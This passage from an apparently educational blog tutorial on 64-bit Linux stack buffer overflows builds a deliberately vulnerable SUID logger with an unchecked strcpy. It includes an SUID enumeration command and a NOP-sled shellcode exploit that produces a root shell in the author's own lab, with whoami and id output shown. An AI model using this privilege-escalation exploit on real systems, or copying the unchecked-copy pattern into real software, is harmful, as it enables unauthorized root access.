{% highlight bash %}
find / -user root -perm -4000 2>/dev/null
{% endhighlight %}

Now combine those two concepts. Imagine there is a SUID binary file with a buffer-overflow vulnerability.

* # SUID Log Program<br>



{% highlight C %}

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vuln(char *input);

int main(int argc, char **argv)
{
  if (argc > 1){
    vuln(argv[1]);
  }else{
    puts("Please provide 'read' or 'write' as an argument to declare the mode.");
  };
}

void vuln(char *input){
  char buffer[256];
  strcpy(buffer, input);
  
  setuid(0);
  if(strcmp(buffer, "read") == 0){
    char file_buffer[500];
    FILE *file = fopen("/root/root_log.txt","r");
    if(file == NULL){
      puts("root_log.txt is missing!\n");
      exit(0);
    }
    int eof = 0;
    printf("Reading root_log.txt: \n");
    do{
      fgets(file_buffer, sizeof(file_buffer), file);
      printf("%s",file_buffer);
      if(feof(file)){
        eof = 1;
      }
    }while(eof == 0);
  }
  if(strcmp(buffer, "write") == 0){
    char file_buffer[500];
    FILE *file = fopen("/root/root_log.txt","a");
    printf("Writing to root_log.txt> ");
    scanf("%495s", file_buffer);
    fprintf(file, "\n%s", file_buffer);
  }
}

{% endhighlight %}

This program manipulates a file named **root_log.txt** which is located in the root's home directory.
With this logger program, a user can write a new log entry or read the entries logged before. However,
in order for any user to use this functionality, the compiled binary must have an SUID bit set. 

So let's log-in as root, compile the source code, and set the SUID bit.

{% highlight shell %}
[root@archlinux reverse]# gcc -no-pie -fno-stack-protector stackBasedSimple.c -o stackBasedSimple.elf -D_FORTIFY_SOURCE=0 -g -z execstack
[root@archlinux reverse]# chmod +s ./stackBasedSimple.elf
[root@archlinux reverse]# ls -la stackBasedSimple.elf
-rwsr-sr-x 1 root root 22896 Dec 26 02:57 stackBasedSimple.elf
#  | that is the SUID bit.
{% endhighlight %}

Note that when we try to access to that file manually, we are denied since we do not have the permission.
{% highlight shell %}
KnuckleSecurity :: -> cat /root/root_log.txt
cat: /root/root_log.txt: Permission denied
KnuckleSecurity :: ->
{% endhighlight %}

Let's try to modify that file with the SUID program.
{% highlight shell %}
KnuckleSecurity :: -> ./stackBased.elf
Please provide 'read' or 'write' as an argument to declare the mode.
KnuckleSecurity :: -> ./stackBased.elf write
Writing to root_log.txt> log1
KnuckleSecurity :: -> ./stackBased.elf write
Writing to root_log.txt> log2
KnuckleSecurity :: -> ./stackBased.elf write
Writing to root_log.txt> KnuckleSecurity
KnuckleSecurity :: -> ./stackBased.elf read
Reading root_log.txt:

log1
log2
KnuckleSecurity%
{% endhighlight %}

It works. However, if you look at to the source code, we have the same vulnerability. Again, the first command line 
argument is being copied into a buffer to select the 'read' or 'write' mode. But still, no border checks. It is 
exactly the same as the previous demo. So let's quickly drop a root shell and escalate our system priveleges
by exploiting this poor logger program.

Calculate the offset.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/27.png){:.normal}
It is 288. 

{% highlight shell %}
r $(perl -e 'print "\x90"x288')BBBBBBBBZZZZZZ
{% endhighlight %}
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/28.png){:.normal}

Next, find an address in the NOP slide.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/29.png){:.normal}
Let's use the 0xfe3c0

I will use the same python code with two tweaks.
- Change the offset.
- Change the RET address.

{% highlight python %}
buff = b"\x90"*(288-len(shellcode))
sys.stdout.buffer.write(buff+shellcode+rbp+b"\xc0\xe3\xff\xff\xff\x7f")
{% endhighlight %}

Time to test it.
{% highlight python %}
KnuckleSecurity :: -> ./stackBased.elf $(python stackBased.py)
bash-5.1: whoami
root
bash-5.1: id
uid=0(root) gid=984(users) groups=984(users),969(libvirt),998(wheel)
{% endhighlight %}

Sweet taste of the victory ;)


# Bibliography
* [**wikipedia.com-Function Prologue and Epilogue**](https://en.wikipedia.org/wiki/Function_prologue_and_epilogue)<br>

* [**feliclouiter.com-Leave**](https://www.felixcloutier.com/x86/leave)<br>

* [**valsamaras.medium.com-Introduction to X64 Binary Exploitation Part-1**](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef)<br>

* [**Book-Practical Reverse Engineering**](https://www.amazon.co.uk/Practical-Reverse-Engineering-Reversing-Obfuscation/dp/1118787315)

* [**Book-Hacking: The Art Of Exploitation**](https://www.amazon.co.uk/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)

* [**wikipedia.com-Memory Hierarchy**](https://en.wikipedia.org/wiki/Memory_hierarchy)

* [**wikipedia.com-Assembly Language**](https://en.wikipedia.org/wiki/Assembly_language)

* [**eli.thegreenplace.net-Stack Frame Layout on x86_64**](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)

* [**techtarget.com-What is Definition Register**](https://www.techtarget.com/whatis/definition/register)

* [**ref.x86asm.net-Coder64**](http://ref.x86asm.net/coder64.html)

* [**isss.io-Resource**](https://www.isss.io/resources)

* [**ctf101.org-Binary Exploitation Overview**](https://ctf101.org/binary-exploitation/overview/)

* [**wikipedia-Calling Convention x86_64**](https://en.wikipedia.org/wiki/Calling_convention#x86-64)
